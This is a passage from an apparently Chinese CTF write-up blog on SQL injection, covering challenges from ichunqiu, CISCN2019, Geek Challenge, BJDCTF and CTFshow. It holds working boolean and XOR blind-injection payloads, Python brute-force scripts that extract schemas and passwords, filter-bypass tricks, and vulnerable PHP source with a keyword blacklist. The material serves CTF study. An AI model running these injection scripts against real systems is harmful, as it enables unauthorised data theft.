class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data <span class="token operator">=</span> data<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'Nu1L'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>            <span class="token keyword">break</span>    flag <span class="token operator">=</span> flag <span class="token operator">+</span> j</code></pre><p>最终可以得到flag</p><h3 id="2020ichunqiu新春公益赛—简单的招聘系统"><a href="#2020ichunqiu新春公益赛—简单的招聘系统" class="headerlink" title="2020ichunqiu新春公益赛—简单的招聘系统"></a>2020ichunqiu新春公益赛—简单的招聘系统</h3><p>界面：</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/9WpDyf1SxXoMCrH.png" style="zoom:80%;" / loading="lazy"><p>尝试使用弱密码，<code>1&#39; or 1=1#</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/tuM3g2DS8hEQ1WL.png" alt="" loading="lazy"></p><p>于是可以在登录界面进行布尔盲注</p><p>爆库Payload：<code>2&#39; or (select (mid((select database()),{},1)))=&#39;{}&#39;#</code></p><p>爆表Payload：<code>2&#39; or (select (mid((select group_concat(table_name,&#39;&#39;) from information_schema.tables where table_schema=database()),{},1)))=&#39;{}&#39;#</code></p><p>爆列Payload：<code>2&#39; or (select (mid((select group_concat(column_name,&#39;&#39;) from information_schema.columns where table_name=&#39;flag&#39;),{},1)))=&#39;{}&#39;#</code></p><p>爆字段Payload：<code>2&#39; or (select (mid((select group_concat(flaaag,&#39;&#39;) from flag),{},1)))=&#39;{}&#39;#</code></p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> stringurl <span class="token operator">=</span> <span class="token string">"http://b191000b2d4c4a77ad9c86f2d5476e7172ed2000f40b4c72.changame.ichunqiu.com/"</span>str <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">"-"</span> <span class="token operator">+</span> string<span class="token punctuation">.</span>digits <span class="token operator">+</span> string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>punctuation<span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"'"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'"'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\\"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span>flag <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> str<span class="token punctuation">:</span>        <span class="token comment" spellcheck="true">#d = "1 and if(ascii(mid(fl4g,1,1))regexp "+str(j)+",sleep(3),1)"</span>        d <span class="token operator">=</span> <span class="token string">"(This is Payload)"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#print(d)</span>        data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"lname"</span><span class="token punctuation">:</span>d <span class="token punctuation">,</span> <span class="token string">"lpass"</span><span class="token punctuation">:</span><span class="token string">'xxx'</span><span class="token punctuation">}</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data <span class="token operator">=</span> data<span class="token punctuation">)</span>        r<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">'gbk'</span>        <span class="token keyword">if</span> <span class="token string">'成功'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'gbk'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span>r<span class="token punctuation">.</span>apparent_encoding<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>            <span class="token keyword">break</span></code></pre><p>得到数据库：<code>nzhaopin</code>,表：<code>backup,flag,user</code>，flag表的内容：<code>id,flaaag</code>，最终得到flag</p><h3 id="CISCN2019-Web1—Hack-World"><a href="#CISCN2019-Web1—Hack-World" class="headerlink" title="CISCN2019-Web1—Hack World"></a>CISCN2019-Web1—Hack World</h3><p><strong>解题核心</strong>—————–异或注入，盲注爆破</p><p>界面：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/t2nS8YpRmGTEsx7.png" alt="" loading="lazy"></p><p>题目给出了flag在flag表和flag列中</p><p>测试后发现过滤了大多数字符，但有些还是没过滤的，于是进行sql盲注</p><p>空格利用<code>()</code>绕过，配合异或注入和判断回显信息一个一个爆出字符串</p><p>python脚本：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://13b50f67-3a54-481d-ae76-97f425fd8855.node3.buuoj.cn/"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        d <span class="token operator">=</span> <span class="token string">"1^(ascii(substr((select(flag)from(flag)),{},1))={})"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span>        data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"id"</span><span class="token punctuation">:</span>d<span class="token punctuation">}</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data <span class="token operator">=</span> data<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'Error'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>chr<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span></code></pre><p>网上这题的源码，可以参考参考</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$dbuser</span><span class="token operator">=</span><span class="token string">'root'</span><span class="token punctuation">;</span><span class="token variable">$dbpass</span><span class="token operator">=</span><span class="token string">'root'</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">safe</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token shell-comment comment">#被过滤的内容 函数基本没过滤</span>    <span class="token variable">$blackList</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span><span class="token string">'||'</span><span class="token punctuation">,</span><span class="token string">'#'</span><span class="token punctuation">,</span><span class="token string">'-'</span><span class="token punctuation">,</span><span class="token string">';'</span><span class="token punctuation">,</span><span class="token string">'&amp;'</span><span class="token punctuation">,</span><span class="token string">'+'</span><span class="token punctuation">,</span><span class="token string">'or'</span><span class="token punctuation">,</span><span class="token string">'and'</span><span class="token punctuation">,</span><span class="token string">'`'</span><span class="token punctuation">,</span><span class="token string">'"'</span><span class="token punctuation">,</span><span class="token string">'insert'</span><span class="token punctuation">,</span><span class="token string">'group'</span><span class="token punctuation">,</span><span class="token string">'limit'</span><span class="token punctuation">,</span><span class="token string">'update'</span><span class="token punctuation">,</span><span class="token string">'delete'</span><span class="token punctuation">,</span><span class="token string">'*'</span><span class="token punctuation">,</span><span class="token string">'into'</span><span class="token punctuation">,</span><span class="token string">'union'</span><span class="token punctuation">,</span><span class="token string">'load_file'</span><span class="token punctuation">,</span><span class="token string">'outfile'</span><span class="token punctuation">,</span><span class="token string">'./'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$blackList</span> <span class="token keyword">as</span> <span class="token variable">$blackitem</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">,</span><span class="token variable">$blackitem</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">return</span> False<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> True<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$db</span> <span class="token operator">=</span> <span class="token function">mysql_connect</span><span class="token punctuation">(</span><span class="token string">"localhost"</span><span class="token punctuation">,</span><span class="token variable">$dbuser</span><span class="token punctuation">,</span><span class="token variable">$dbpass</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$db</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>   <span class="token function">mysql_select_db</span><span class="token punctuation">(</span><span class="token string">"ctf"</span><span class="token punctuation">,</span><span class="token variable">$db</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">safe</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$query</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token string">"SELECT content from passage WHERE id = ${id} limit 0,1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token variable">$result</span><span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">"Error Occured When Fetch Result."</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"SQL Injection Checked."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="极客大挑战—FinalSQL"><a href="#极客大挑战—FinalSQL" class="headerlink" title="极客大挑战—FinalSQL"></a>极客大挑战—FinalSQL</h3><p><strong>解题核心</strong>—————–异或注入，盲注爆破</p><p>界面：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-153.png" alt="" loading="lazy"></p><p>在用户名和密码密码处尝试注入，发现绝大多数的字符都被过滤，于是找到另一个注入点（如下图），把注释删掉后在界面传参回车后观察URL的变化，传了一个id参数，故尝试在URL中的id处注入</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/MK1eADvmQB6dsRu.png" style="zoom: 80%;" / loading="lazy"><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/image-155.png" style="zoom:33%;" / loading="lazy"><p>后台过滤到限制字符的显示的界面（如下图）</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/R4IgVByGQD1h6Pk.png" style="zoom:33%;" / loading="lazy"><p>当注入上一题的查询数据库语句时，发现可以注入，显示以下界面，应该是后台把报错的界面给处理了，所以看不到数据库报错的界面</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/yjbmJD4Ocn76fCA.png" style="zoom:33%;" / loading="lazy"><p>进行异或注入测试：</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/cZS7VApdoaqNXOY.png" style="zoom:33%;" / loading="lazy"><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/CHb6hqjxP7R8QuZ.png" style="zoom:33%;" / loading="lazy"><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/D1vCu2slx3QiVIM.png" style="zoom:33%;" / loading="lazy"><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/mKkaqdETW7U9I3Z.png" style="zoom:33%;" / loading="lazy"><p>通过上面的测试发现，id=1^1的结果和id=0的结果是一样的，二当id=1^0的时候，界面就返回了当id=1的时候的界面，由此可以想到通过构造ASCII函数配合substr函数判断字符大小，当ASCII函数值等于（居然没过滤）后面的十进制时，显示id=0的时候的界面，具体脚本和判断方法如下：</p><pre class=" language-sql"><code class="language-sql"><span class="token number">1</span><span class="token operator">^</span><span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"此处为sql语句"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>变量i<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span>变量j<span class="token punctuation">)</span></code></pre><p>查库：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://8a4e2d60-6624-4865-b943-aa15ea964e76.node3.buuoj.cn/search.php"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        d <span class="token operator">=</span> <span class="token string">"?id=1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where((table_schema)like'geek')),'"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"',1))='"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"')"</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span>d<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'ERROR'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>chr<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span></code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/31rlIa5vfeoYkNF.png" alt="" loading="lazy"></p><p>查表：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://8a4e2d60-6624-4865-b943-aa15ea964e76.node3.buuoj.cn/search.php"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        d <span class="token operator">=</span> <span class="token string">"?id=1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where((table_schema)='geek')),'"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"',1))='"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"')"</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span>d<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'ERROR'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>chr<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span></code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/iOdeEnDWUwNK8V3.png" alt="" loading="lazy"></p><p>查列：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://8a4e2d60-6624-4865-b943-aa15ea964e76.node3.buuoj.cn/search.php"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        d <span class="token operator">=</span> <span class="token string">"?id=1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where((table_name)='F1naI1y')),'"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"',1))='"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"')"</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span>d<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'ERROR'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>chr<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span></code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/DTSb4nMyjg6e89R.png" alt="" loading="lazy"></p><p>emmmmmmm这里长度没给够，根据前面的经验，查password列应该就可以了，F1aaaaag表中没有东西</p><p>查字段：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://8a4e2d60-6624-4865-b943-aa15ea964e76.node3.buuoj.cn/search.php"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">300</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        d <span class="token operator">=</span> <span class="token string">"?id=1^(ascii(substr((select(group_concat(password))from(F1naI1y)),'"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"',1))='"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"')"</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span>d<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'ERROR'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>chr<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span></code></pre><p>拿到flag：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/RvGOsyKqSXYNEug.png" alt="" loading="lazy"></p><h3 id="BJDCTF-2nd—简单注入"><a href="#BJDCTF-2nd—简单注入" class="headerlink" title="BJDCTF-2nd—简单注入"></a>BJDCTF-2nd—简单注入</h3><p><strong>解题核心</strong>—————–regexp()正则匹配，binary大小写匹配，布尔盲注(亦可时间盲注)</p><p>参考：<a href="https://www.gem-love.com/ctf/2097.html#GirlfriendInjection" target="_blank" rel="noopener">https://www.gem-love.com/ctf/2097.html#GirlfriendInjection</a></p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/rODhM3lG8ux9Hdf.png" style="zoom:80%;" / loading="lazy"><p>这题看着界面有点眼熟，这这个网站上有个类似的题<a href="http://pcat.cc/q.php" target="_blank" rel="noopener">http://pcat.cc/q.php</a> ，Question 5那一期的web题</p><p>先fuzz一下，以下字符被过滤：</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/FnfpO9AMlex8UdC.png" style="zoom: 80%;" / loading="lazy"><p>几个常用的注入参数被过滤：<code>&#39; &quot; select</code>，这几个参数被过滤就已经杀了大部分的可注入方式，于是想办法构造注入条件，题目解题思路和Question 5那一期的web题类似，直接给出解题方法</p><p>解题方法：在用户名处注入反斜杆<code>\</code>，可以将后端<code>sql</code>语句处<code>username</code>的后面的单引号转义</p><p>推测后端sql语句变成</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> username password <span class="token keyword">from</span> users <span class="token keyword">where</span> username <span class="token operator">=</span> <span class="token string">'1\' and password = '</span> <span class="token operator">or</span> <span class="token number">1</span><span class="token comment" spellcheck="true">#'</span></code></pre><p>测试后发题目下方的字符串改变了（可惜比赛的时候没注意），可以用regexp正则模糊匹配的方法构造sql注入语句注出<code>admin</code>的<code>password</code>，于是写<code>python</code>脚本盲注</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/Vc2DsFmxGRngN4p.png" style="zoom: 80%;" / loading="lazy"><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://507fd7ed-7cc8-42d3-86ad-6b5ec032b815.node3.buuoj.cn/index.php"</span>header <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0"</span><span class="token punctuation">,</span>    <span class="token string">"Accept"</span><span class="token punctuation">:</span> <span class="token string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"</span><span class="token punctuation">,</span>    <span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"application/x-www-form-urlencoded"</span><span class="token punctuation">}</span>str1 <span class="token operator">=</span> <span class="token string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'</span>passwd <span class="token operator">=</span> <span class="token string">''</span>pass1 <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> str1<span class="token punctuation">:</span>        pass1 <span class="token operator">=</span> <span class="token string">'0x5E'</span> <span class="token operator">+</span> passwd<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0x5E'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span>        payload <span class="token operator">=</span> <span class="token string">' or password regexp binary {}#'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>pass1<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#print(pass1)</span>        data <span class="token operator">=</span> <span class="token punctuation">{</span>            <span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string">'1\\'</span><span class="token punctuation">,</span>            <span class="token string">'password'</span><span class="token punctuation">:</span> payload        <span class="token punctuation">}</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">,</span>headers<span class="token operator">=</span>header<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'BJD needs'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            passwd <span class="token operator">=</span> passwd <span class="token operator">+</span> hex<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>            <span class="token keyword">break</span></code></pre><p>注意这里<code>binary</code>的使用，比赛的时候就是被这里给坑了=.=，mysql默认不区分大小写，这里使用该关键字来区分大小写，还有<code>regexp</code>函数可以匹配十六进制数，涨姿势了，这样就可以绕过引号的过滤，另外上面的<code>Ezsqli</code>题也还有一种匹配大小写的方法，用于<code>in</code>被过滤，<code>binary</code>就不好使了</p><p>最后盲注出<code>password</code>为<code>OhyOuFOuNdit</code>登录<code>admin</code>账号即可得到<code>flag</code></p><p>另外还有一种时间盲注的方法： <code>or if(substr(password,1,1)regexp binary 0x5E...,sleep(3),1)</code></p><h3 id="CTFshow—web1"><a href="#CTFshow—web1" class="headerlink" title="CTFshow—web1"></a>CTFshow—web1</h3><p>访问<code>www.zip</code>得到源码</p><p>index.php（略）</p><p>login.php</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>        <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$con</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token string">"localhost"</span><span class="token punctuation">,</span><span class="token string">"root"</span><span class="token punctuation">,</span><span class="token string">"root"</span><span class="token punctuation">,</span><span class="token string">"web15"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$con</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Could not connect: '</span> <span class="token punctuation">.</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token 